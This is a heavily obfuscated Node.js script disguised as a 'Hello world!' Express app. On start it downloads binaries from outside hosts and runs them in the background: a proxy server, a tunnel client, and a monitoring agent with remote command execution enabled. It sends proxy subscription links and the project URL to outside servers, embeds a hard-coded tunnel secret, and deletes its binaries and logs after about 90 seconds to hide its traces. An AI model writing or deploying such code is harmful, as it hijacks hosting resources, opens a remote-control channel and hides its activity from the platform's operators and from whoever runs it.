const _0x379842=_0x5b01;(function(_0x25b9c6,_0x5ac0e5){const _0x390ad6=_0x5b01,_0x470cf6=_0x25b9c6();while(!![]){try{const _0x5864a8=parseInt(_0x390ad6(0x9f))/0x1+-parseInt(_0x390ad6(0x9d))/0x2*(-parseInt(_0x390ad6(0x90))/0x3)+parseInt(_0x390ad6(0xae))/0x4+parseInt(_0x390ad6(0xce))/0x5+-parseInt(_0x390ad6(0xe4))/0x6*(-parseInt(_0x390ad6(0xba))/0x7)+parseInt(_0x390ad6(0xb2))/0x8*(parseInt(_0x390ad6(0x87))/0x9)+parseInt(_0x390ad6(0xc1))/0xa*(-parseInt(_0x390ad6(0x79))/0xb);if(_0x5864a8===_0x5ac0e5)break;else _0x470cf6['push'](_0x470cf6['shift']());}catch(_0x591cfc){_0x470cf6['push'](_0x470cf6['shift']());}}}(_0xa9f0,0x39e1d));const express=require(_0x379842(0xee)),app=express(),axios=require(_0x379842(0xcc)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x379842(0xfa)),exec=promisify(require(_0x379842(0xf4))[_0x379842(0xf6)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x379842(0x7a)][_0x379842(0xc9)]||'',PROJECT_URL=process[_0x379842(0x7a)][_0x379842(0xa5)]||'',AUTO_ACCESS=process[_0x379842(0x7a)][_0x379842(0x69)]||![],FILE_PATH=process[_0x379842(0x7a)][_0x379842(0xe7)]||_0x379842(0xfe),S_PATH=process[_0x379842(0x7a)][_0x379842(0xe9)]||_0x379842(0xf7),PORT=process[_0x379842(0x7a)][_0x379842(0x94)]||process['env'][_0x379842(0x10c)]||0xbb8,UUID=process[_0x379842(0x7a)][_0x379842(0x9c)]||_0x379842(0x82),N_SERVER=process[_0x379842(0x7a)]['N_SERVER']||_0x379842(0xc3),N_PORT=process[_0x379842(0x7a)][_0x379842(0xa6)]||'443',N_KEY=process[_0x379842(0x7a)][_0x379842(0x68)]||_0x379842(0xec),ERGOU_DOMAIN=process['env'][_0x379842(0xa1)]||_0x379842(0x8f),ERGOU_AUTH=process[_0x379842(0x7a)]['ERGOU_AUTH']||_0x379842(0xa3),ERGOU_PORT=process[_0x379842(0x7a)][_0x379842(0xf5)]||0x1f41,CFIP=process[_0x379842(0x7a)]['CFIP']||_0x379842(0x66),CFPORT=process['env'][_0x379842(0xe2)]||0x1bb,NAME=process[_0x379842(0x7a)][_0x379842(0xd3)]||_0x379842(0xb6);!fs[_0x379842(0x92)](FILE_PATH)?(fs[_0x379842(0xf1)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x379842(0xe6)](FILE_PATH+_0x379842(0x99));let npmPath=path['join'](FILE_PATH,_0x379842(0x80)),phpPath=path[_0x379842(0xeb)](FILE_PATH,_0x379842(0x97)),webPath=path[_0x379842(0xeb)](FILE_PATH,_0x379842(0xbe)),botPath=path[_0x379842(0xeb)](FILE_PATH,_0x379842(0x72)),subPath=path[_0x379842(0xeb)](FILE_PATH,'sub.txt'),listPath=path[_0x379842(0xeb)](FILE_PATH,'list.txt'),bootLogPath=path[_0x379842(0xeb)](FILE_PATH,_0x379842(0xc8)),configPath=path['join'](FILE_PATH,_0x379842(0xbf));function _0x5b01(_0xf190ef,_0x5ab7c2){const _0xa9f008=_0xa9f0();return _0x5b01=function(_0x5b01e8,_0x3d6e64){_0x5b01e8=_0x5b01e8-0x64;let _0x304767=_0xa9f008[_0x5b01e8];return _0x304767;},_0x5b01(_0xf190ef,_0x5ab7c2);}function _0xa9f0(){const _0xe8ddcb=['ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','get','&path=%2Fvless-argo%3Fed%3D2560#','ip.sb','\x20failed:\x20','N_KEY','AUTO_ACCESS','web\x20running\x20error:\x20','TunnelSecret','bot\x20is\x20running','utf-8','arm64','/trojan-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','length','bot','/bot\x20','stringify','stream','&type=ws&host=','createWriteStream','/api/add-subscriptions','11LoRvqR','env','base64','freedom','includes','App\x20is\x20running','Error\x20executing\x20command:\x20','npm','toString','9afd1229-b893-40c1-84dd-51e7ce204913','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','fileUrl','127.0.0.1','quic','36nSueMC','web\x20is\x20running','has','tls','/npm\x20-s\x20','fileName','/vless-argo','false','idx-3.333333.pp.ua','3yDuWJq','readFileSync','existsSync','./php','SERVER_PORT','application/json','true','php','automatic\x20access\x20task\x20added\x20successfully','\x20already\x20exists','http','https://arm64.ssss.nyc.mn/v1','UUID','938356XFJUwg','https://amd64.ssss.nyc.mn/web','115725qeANqB','./bot','ERGOU_DOMAIN','https://oooo.serv00.net/add-url','{\x22AccountTag\x22:\x22854053d711712e9d3f717b21d1459630\x22,\x22TunnelSecret\x22:\x22/mXRIc00V9qF8XJt3ZlOSV8eBZmDenubvE4R0AgR+qc=\x22,\x22TunnelID\x22:\x2220545e4f-83a2-4430-8511-186fe4fdfff2\x22,\x22Endpoint\x22:\x22\x22}','/vmess-argo','PROJECT_URL','N_PORT','unshift','error','filter','http\x20server\x20is\x20running\x20on\x20port:','unlinkSync','\x0a\x20\x20\x20\x20','Empowerment\x20success\x20for\x20','1300928PVSVWk','vless','vmess','map','520480knZOch','set','2087','/config.json\x20>/dev/null\x202>&1\x20&','galaxycloud-EU','https://arm64.ssss.nyc.mn/agent','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','7NIgLXn','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','direct','forEach','web','config.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','15313990PkxzWW','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tz.234.pp.ua','pipe','\x20>/dev/null\x202>&1\x20&','clear','8443','boot.log','UPLOAD_URL','message','rm\x20-rf\x20','axios','arm','944430wmnzRQ','from','/sub.txt\x20saved\x20successfully','xtls-rprx-vision','then','NAME','/web\x20-c\x20','2096','Subscription\x20uploaded\x20successfully','close','chmod','Download\x20','tcp','2083','config.yaml','listen','/tunnel.yml\x20run','Empowerment\x20failed\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','./web','CFPORT','unlink','2455338GpnHnI','https://arm64.ssss.nyc.mn/2go','log','FILE_PATH','catch','S_PATH','&path=%2Ftrojan-argo%3Fed%3D2560#','join','7lht2X55kS7c8jBHBu','https://amd64.ssss.nyc.mn/2go','express','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Skipping\x20adding\x20automatic\x20access\x20task','mkdirSync','response','writeFileSync','child_process','ERGOU_PORT','exec','sub','ERGOU_DOMAIN:','text/plain;\x20charset=utf-8','util','status','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20tunnel:\x20','./tmp','tunnel.yml','php\x20is\x20running','\x20successfully','split','/api/delete-nodes','?encryption=none&security=tls&sni=','\x0avless://','N\x20variable\x20is\x20empty,skip\x20running','./npm','send','\x0a\x20\x20\x0avmess://','test','npm\x20running\x20error:\x20','PORT','blackhole','/vmess-argo?ed=2560','Content-Type','2053','match','Hello\x20world!','添加URL失败:\x20','/dev/null','none','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/php\x20-c\x20\x22','tunnel.json','\x0a\x20\x20\x0atrojan://','nohup\x20','/api/add-nodes','push','post','sub.txt'];_0xa9f0=function(){return _0xe8ddcb;};return _0xa9f0();}function deleteNodes(){const _0x2dfdeb=_0x379842;try{if(!UPLOAD_URL)return;if(!fs[_0x2dfdeb(0x92)](subPath))return;let _0x62390e;try{_0x62390e=fs[_0x2dfdeb(0x91)](subPath,_0x2dfdeb(0x6d));}catch{return null;}const _0x5cfbfe=Buffer[_0x2dfdeb(0xcf)](_0x62390e,_0x2dfdeb(0x7b))[_0x2dfdeb(0x81)](_0x2dfdeb(0x6d)),_0x26c533=_0x5cfbfe[_0x2dfdeb(0x102)]('\x0a')[_0x2dfdeb(0xa9)](_0x77cb06=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2dfdeb(0x10a)](_0x77cb06));if(_0x26c533[_0x2dfdeb(0x71)]===0x0)return;return axios[_0x2dfdeb(0x11d)](UPLOAD_URL+_0x2dfdeb(0x103),JSON[_0x2dfdeb(0x74)]({'nodes':_0x26c533}),{'headers':{'Content-Type':_0x2dfdeb(0x95)}})[_0x2dfdeb(0xe8)](_0x55d95f=>{return null;});}catch(_0x24d219){return null;}}function cleanupOldFiles(){const _0x2927cd=_0x379842,_0x10d303=[_0x2927cd(0xbe),_0x2927cd(0x72),'npm',_0x2927cd(0x97),_0x2927cd(0x11e),_0x2927cd(0xc8)];_0x10d303[_0x2927cd(0xbd)](_0x40634f=>{const _0x5011db=_0x2927cd,_0x23a4f5=path[_0x5011db(0xeb)](FILE_PATH,_0x40634f);fs[_0x5011db(0xe3)](_0x23a4f5,()=>{});});}app[_0x379842(0x64)]('/',function(_0x32b5f0,_0x59d9a5){const _0x4fa3a8=_0x379842;_0x59d9a5[_0x4fa3a8(0x108)](_0x4fa3a8(0x112));});const config={'log':{'access':_0x379842(0x114),'error':_0x379842(0x114),'loglevel':_0x379842(0x115)},'inbounds':[{'port':ERGOU_PORT,'protocol':_0x379842(0xaf),'settings':{'clients':[{'id':UUID,'flow':_0x379842(0xd1)}],'decryption':_0x379842(0x115),'fallbacks':[{'dest':0xbb9},{'path':_0x379842(0x8d),'dest':0xbba},{'path':_0x379842(0xa4),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x379842(0xda)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x379842(0xaf),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x379842(0xda),'security':'none'}},{'port':0xbba,'listen':_0x379842(0x85),'protocol':_0x379842(0xaf),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x379842(0x115)},'streamSettings':{'network':'ws','security':_0x379842(0x115),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x379842(0x9a),_0x379842(0x8a),_0x379842(0x86)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x379842(0x85),'protocol':_0x379842(0xb0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x379842(0xa4)}},'sniffing':{'enabled':!![],'destOverride':[_0x379842(0x9a),_0x379842(0x8a),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x379842(0x115),'wsSettings':{'path':_0x379842(0x6f)}},'sniffing':{'enabled':!![],'destOverride':[_0x379842(0x9a),'tls',_0x379842(0x86)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x379842(0x7c),'tag':_0x379842(0xbc)},{'protocol':_0x379842(0x10d),'tag':'block'}]};fs[_0x379842(0xf3)](path[_0x379842(0xeb)](FILE_PATH,_0x379842(0xbf)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x33add7=_0x379842,_0x3a5a93=os['arch']();return _0x3a5a93===_0x33add7(0xcd)||_0x3a5a93===_0x33add7(0x6e)||_0x3a5a93==='aarch64'?'arm':'amd';}function downloadFile(_0x17f180,_0x515014,_0x2f5a7c){const _0x59cfb7=_0x379842,_0x2081aa=path[_0x59cfb7(0xeb)](FILE_PATH,_0x17f180),_0x57bb0f=fs[_0x59cfb7(0x77)](_0x2081aa);axios({'method':_0x59cfb7(0x64),'url':_0x515014,'responseType':_0x59cfb7(0x75)})[_0x59cfb7(0xd2)](_0x1fcd92=>{const _0x24bbaf=_0x59cfb7;_0x1fcd92['data'][_0x24bbaf(0xc4)](_0x57bb0f),_0x57bb0f['on']('finish',()=>{const _0x3878a5=_0x24bbaf;_0x57bb0f[_0x3878a5(0xd7)](),console[_0x3878a5(0xe6)](_0x3878a5(0xd9)+_0x17f180+_0x3878a5(0x101)),_0x2f5a7c(null,_0x17f180);}),_0x57bb0f['on']('error',_0x3d40b5=>{const _0x52e5a9=_0x24bbaf;fs[_0x52e5a9(0xe3)](_0x2081aa,()=>{});const _0x14f5e9='Download\x20'+_0x17f180+_0x52e5a9(0x67)+_0x3d40b5[_0x52e5a9(0xca)];console[_0x52e5a9(0xa8)](_0x14f5e9),_0x2f5a7c(_0x14f5e9);});})[_0x59cfb7(0xe8)](_0x11c3a7=>{const _0x9f59f7=_0x59cfb7,_0x58d7ad=_0x9f59f7(0xd9)+_0x17f180+_0x9f59f7(0x67)+_0x11c3a7[_0x9f59f7(0xca)];console[_0x9f59f7(0xa8)](_0x58d7ad),_0x2f5a7c(_0x58d7ad);});}async function downloadFilesAndRun(){const _0x1c6fc0=_0x379842,_0xe6bf02=getSystemArchitecture(),_0x483d30=getFilesForArchitecture(_0xe6bf02);if(_0x483d30[_0x1c6fc0(0x71)]===0x0){console['log'](_0x1c6fc0(0xbb));return;}const _0x4471fb=_0x483d30[_0x1c6fc0(0xb1)](_0x3b2524=>{return new Promise((_0x18af00,_0x2de5c0)=>{const _0x54c2ae=_0x5b01;downloadFile(_0x3b2524[_0x54c2ae(0x8c)],_0x3b2524[_0x54c2ae(0x84)],(_0x2cd84e,_0x8ea50d)=>{_0x2cd84e?_0x2de5c0(_0x2cd84e):_0x18af00(_0x8ea50d);});});});try{await Promise['all'](_0x4471fb);}catch(_0x52e916){console[_0x1c6fc0(0xa8)]('Error\x20downloading\x20files:',_0x52e916);return;}function _0x3f0326(_0xaa977a){const _0x29168d=_0x1c6fc0,_0x8c4064=0x1fd;_0xaa977a[_0x29168d(0xbd)](_0x56e581=>{const _0xbebf9d=_0x29168d,_0x457b8e=path[_0xbebf9d(0xeb)](FILE_PATH,_0x56e581);fs[_0xbebf9d(0x92)](_0x457b8e)&&fs[_0xbebf9d(0xd8)](_0x457b8e,_0x8c4064,_0x2bc246=>{const _0x113248=_0xbebf9d;_0x2bc246?console[_0x113248(0xa8)](_0x113248(0xdf)+_0x457b8e+':\x20'+_0x2bc246):console[_0x113248(0xe6)](_0x113248(0xad)+_0x457b8e+':\x20'+_0x8c4064[_0x113248(0x81)](0x8));});});}const _0xb3415e=N_PORT?[_0x1c6fc0(0x107),_0x1c6fc0(0xe1),_0x1c6fc0(0xa0)]:[_0x1c6fc0(0x93),'./web',_0x1c6fc0(0xa0)];_0x3f0326(_0xb3415e);if(N_SERVER&&N_KEY){if(!N_PORT){const _0x1c27df=N_SERVER[_0x1c6fc0(0x7d)](':')?N_SERVER[_0x1c6fc0(0x102)](':')['pop']():'',_0x5c52ce=new Set(['443',_0x1c6fc0(0xc7),_0x1c6fc0(0xd5),'2087',_0x1c6fc0(0xdb),'2053']),_0x487e28=_0x5c52ce[_0x1c6fc0(0x89)](_0x1c27df)?_0x1c6fc0(0x96):_0x1c6fc0(0x8e),_0x41c65d='\x0aclient_secret:\x20'+N_KEY+_0x1c6fc0(0xb9)+N_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x487e28+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x1c6fc0(0xf3)](path[_0x1c6fc0(0xeb)](FILE_PATH,_0x1c6fc0(0xdc)),_0x41c65d);const _0x22e750=_0x1c6fc0(0x11a)+FILE_PATH+_0x1c6fc0(0x117)+FILE_PATH+_0x1c6fc0(0x83);try{await exec(_0x22e750),console[_0x1c6fc0(0xe6)](_0x1c6fc0(0x100)),await new Promise(_0x4f722c=>setTimeout(_0x4f722c,0x3e8));}catch(_0x138dbf){console[_0x1c6fc0(0xa8)]('php\x20running\x20error:\x20'+_0x138dbf);}}else{let _0x1ebe89='';const _0x44d57a=['443','8443','2096',_0x1c6fc0(0xb4),_0x1c6fc0(0xdb),_0x1c6fc0(0x110)];_0x44d57a['includes'](N_PORT)&&(_0x1ebe89='--tls');const _0x1b0f04=_0x1c6fc0(0x11a)+FILE_PATH+_0x1c6fc0(0x8b)+N_SERVER+':'+N_PORT+'\x20-p\x20'+N_KEY+'\x20'+_0x1ebe89+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1b0f04),console[_0x1c6fc0(0xe6)]('npm\x20is\x20running'),await new Promise(_0x14429d=>setTimeout(_0x14429d,0x3e8));}catch(_0x233f44){console[_0x1c6fc0(0xa8)](_0x1c6fc0(0x10b)+_0x233f44);}}}else console['log'](_0x1c6fc0(0x106));const _0x5978ae=_0x1c6fc0(0x11a)+FILE_PATH+_0x1c6fc0(0xd4)+FILE_PATH+_0x1c6fc0(0xb5);try{await exec(_0x5978ae),console[_0x1c6fc0(0xe6)](_0x1c6fc0(0x88)),await new Promise(_0x5d9664=>setTimeout(_0x5d9664,0x3e8));}catch(_0x3c6b80){console[_0x1c6fc0(0xa8)](_0x1c6fc0(0x6a)+_0x3c6b80);}if(fs[_0x1c6fc0(0x92)](path['join'](FILE_PATH,'bot'))){let _0xb5a1a8;if(ERGOU_AUTH[_0x1c6fc0(0x111)](/^[A-Z0-9a-z=]{120,250}$/))_0xb5a1a8='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ERGOU_AUTH;else ERGOU_AUTH[_0x1c6fc0(0x111)](/TunnelSecret/)?_0xb5a1a8=_0x1c6fc0(0xe0)+FILE_PATH+_0x1c6fc0(0xde):_0xb5a1a8=_0x1c6fc0(0xc2)+FILE_PATH+_0x1c6fc0(0xb8)+ERGOU_PORT;try{await exec(_0x1c6fc0(0x11a)+FILE_PATH+_0x1c6fc0(0x73)+_0xb5a1a8+'\x20>/dev/null\x202>&1\x20&'),console[_0x1c6fc0(0xe6)](_0x1c6fc0(0x6c)),await new Promise(_0xac80ec=>setTimeout(_0xac80ec,0x7d0));}catch(_0x4b0c11){console[_0x1c6fc0(0xa8)](_0x1c6fc0(0x7f)+_0x4b0c11);}}await new Promise(_0x2da099=>setTimeout(_0x2da099,0x1388));}function getFilesForArchitecture(_0xff2eb4){const _0x37ad36=_0x379842;let _0x27123d;_0xff2eb4===_0x37ad36(0xcd)?_0x27123d=[{'fileName':_0x37ad36(0xbe),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':_0x37ad36(0x72),'fileUrl':_0x37ad36(0xe5)}]:_0x27123d=[{'fileName':_0x37ad36(0xbe),'fileUrl':_0x37ad36(0x9e)},{'fileName':_0x37ad36(0x72),'fileUrl':_0x37ad36(0xed)}];if(N_SERVER&&N_KEY){if(N_PORT){const _0x1f6d68=_0xff2eb4===_0x37ad36(0xcd)?_0x37ad36(0xb7):_0x37ad36(0xfc);_0x27123d[_0x37ad36(0xa7)]({'fileName':_0x37ad36(0x80),'fileUrl':_0x1f6d68});}else{const _0x56abfc=_0xff2eb4===_0x37ad36(0xcd)?_0x37ad36(0x9b):'https://amd64.ssss.nyc.mn/v1';_0x27123d['unshift']({'fileName':'php','fileUrl':_0x56abfc});}}return _0x27123d;}function argoType(){const _0x16a258=_0x379842;if(!ERGOU_AUTH||!ERGOU_DOMAIN){console[_0x16a258(0xe6)]('ERGOU_DOMAIN\x20or\x20ERGOU_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ERGOU_AUTH['includes'](_0x16a258(0x6b))){fs[_0x16a258(0xf3)](path[_0x16a258(0xeb)](FILE_PATH,_0x16a258(0x118)),ERGOU_AUTH);const _0x4d4f15=_0x16a258(0xfd)+ERGOU_AUTH[_0x16a258(0x102)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x16a258(0x118))+_0x16a258(0x116)+ERGOU_DOMAIN+_0x16a258(0xc0)+ERGOU_PORT+_0x16a258(0x70);fs['writeFileSync'](path['join'](FILE_PATH,_0x16a258(0xff)),_0x4d4f15);}else console[_0x16a258(0xe6)]('ERGOU_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x12b085=_0x379842;let _0x4bacec;if(ERGOU_AUTH&&ERGOU_DOMAIN)_0x4bacec=ERGOU_DOMAIN,console[_0x12b085(0xe6)](_0x12b085(0xf8),_0x4bacec),await _0xf14c28(_0x4bacec);else try{const _0x5d71a5=fs[_0x12b085(0x91)](path[_0x12b085(0xeb)](FILE_PATH,_0x12b085(0xc8)),_0x12b085(0x6d)),_0x171f87=_0x5d71a5[_0x12b085(0x102)]('\x0a'),_0x3dc704=[];_0x171f87[_0x12b085(0xbd)](_0x5c3c45=>{const _0x47537f=_0x12b085,_0x2d66e0=_0x5c3c45[_0x47537f(0x111)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2d66e0){const _0x93934f=_0x2d66e0[0x1];_0x3dc704[_0x47537f(0x11c)](_0x93934f);}});if(_0x3dc704[_0x12b085(0x71)]>0x0)_0x4bacec=_0x3dc704[0x0],console[_0x12b085(0xe6)]('ArgoDomain:',_0x4bacec),await _0xf14c28(_0x4bacec);else{console[_0x12b085(0xe6)](_0x12b085(0x11f)),fs[_0x12b085(0xab)](path[_0x12b085(0xeb)](FILE_PATH,_0x12b085(0xc8)));async function _0x5a441f(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2b9b58){}}_0x5a441f(),await new Promise(_0x9f7210=>setTimeout(_0x9f7210,0xbb8));const _0x1742e8=_0x12b085(0xc2)+FILE_PATH+_0x12b085(0xb8)+ERGOU_PORT;try{await exec(_0x12b085(0x11a)+path[_0x12b085(0xeb)](FILE_PATH,_0x12b085(0x72))+'\x20'+_0x1742e8+_0x12b085(0xc5)),console[_0x12b085(0xe6)]('bot\x20is\x20running.'),await new Promise(_0x4c4f75=>setTimeout(_0x4c4f75,0xbb8)),await extractDomains();}catch(_0x5c9266){console[_0x12b085(0xa8)]('Error\x20executing\x20command:\x20'+_0x5c9266);}}}catch(_0x13a86d){console['error']('Error\x20reading\x20boot.log:',_0x13a86d);}async function _0xf14c28(_0x168f45){const _0x145686=_0x12b085,_0x909951=execSync(_0x145686(0xef),{'encoding':_0x145686(0x6d)}),_0x2e2012=_0x909951['trim']();return new Promise(_0x4cbf85=>{setTimeout(()=>{const _0x375f95=_0x5b01,_0xead5ac={'v':'2','ps':NAME+'-'+_0x2e2012,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x168f45,'path':_0x375f95(0x10e),'tls':'tls','sni':_0x168f45,'alpn':''},_0x490f21=_0x375f95(0x105)+UUID+'@'+CFIP+':'+CFPORT+_0x375f95(0x104)+_0x168f45+_0x375f95(0x76)+_0x168f45+_0x375f95(0x65)+NAME+'-'+_0x2e2012+_0x375f95(0x109)+Buffer[_0x375f95(0xcf)](JSON[_0x375f95(0x74)](_0xead5ac))[_0x375f95(0x81)]('base64')+_0x375f95(0x119)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x168f45+_0x375f95(0x76)+_0x168f45+_0x375f95(0xea)+NAME+'-'+_0x2e2012+_0x375f95(0xac);console['log'](Buffer[_0x375f95(0xcf)](_0x490f21)['toString']('base64')),fs[_0x375f95(0xf3)](subPath,Buffer[_0x375f95(0xcf)](_0x490f21)[_0x375f95(0x81)](_0x375f95(0x7b))),console[_0x375f95(0xe6)](FILE_PATH+_0x375f95(0xd0)),uplodNodes(),app[_0x375f95(0x64)]('/'+S_PATH,(_0x234dfa,_0x3a7129)=>{const _0x44b5ae=_0x375f95,_0x9ea8=Buffer[_0x44b5ae(0xcf)](_0x490f21)[_0x44b5ae(0x81)](_0x44b5ae(0x7b));_0x3a7129[_0x44b5ae(0xb3)](_0x44b5ae(0x10f),_0x44b5ae(0xf9)),_0x3a7129[_0x44b5ae(0x108)](_0x9ea8);}),_0x4cbf85(_0x490f21);},0x7d0);});}}async function uplodNodes(){const _0x370a19=_0x379842;if(UPLOAD_URL&&PROJECT_URL){const _0x223b08=PROJECT_URL+'/'+S_PATH,_0x123596={'subscription':[_0x223b08]};try{const _0x229259=await axios[_0x370a19(0x11d)](UPLOAD_URL+_0x370a19(0x78),_0x123596,{'headers':{'Content-Type':_0x370a19(0x95)}});if(_0x229259[_0x370a19(0xfb)]===0xc8)console[_0x370a19(0xe6)](_0x370a19(0xd6));else return null;}catch(_0x5bec57){if(_0x5bec57['response']){if(_0x5bec57[_0x370a19(0xf2)][_0x370a19(0xfb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x370a19(0x92)](listPath))return;const _0x3c8765=fs['readFileSync'](listPath,_0x370a19(0x6d)),_0x277080=_0x3c8765[_0x370a19(0x102)]('\x0a')['filter'](_0x1efaf5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1efaf5));if(_0x277080['length']===0x0)return;const _0xc8c198=JSON[_0x370a19(0x74)]({'nodes':_0x277080});try{await axios[_0x370a19(0x11d)](UPLOAD_URL+_0x370a19(0x11b),_0xc8c198,{'headers':{'Content-Type':_0x370a19(0x95)}});if(response[_0x370a19(0xfb)]===0xc8)console[_0x370a19(0xe6)](_0x370a19(0xd6));else return null;}catch(_0x4c6376){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x560ed0=_0x5b01,_0x496509=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(N_PORT)_0x496509[_0x560ed0(0x11c)](npmPath);else N_SERVER&&N_KEY&&_0x496509['push'](phpPath);exec(_0x560ed0(0xcb)+_0x496509[_0x560ed0(0xeb)]('\x20')+'\x20>/dev/null\x202>&1',_0x1fef2a=>{const _0x10511d=_0x560ed0;console[_0x10511d(0xc6)](),console[_0x10511d(0xe6)](_0x10511d(0x7e)),console[_0x10511d(0xe6)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x349bfa=_0x379842;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x349bfa(0xe6)](_0x349bfa(0xf0));return;}try{const _0x3b7ddd=await axios['post'](_0x349bfa(0xa2),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console['log'](_0x349bfa(0x98));}catch(_0x4e48f1){console['error'](_0x349bfa(0x113)+_0x4e48f1[_0x349bfa(0xca)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x379842(0xdd)](PORT,()=>console[_0x379842(0xe6)](_0x379842(0xaa)+PORT+'!'));
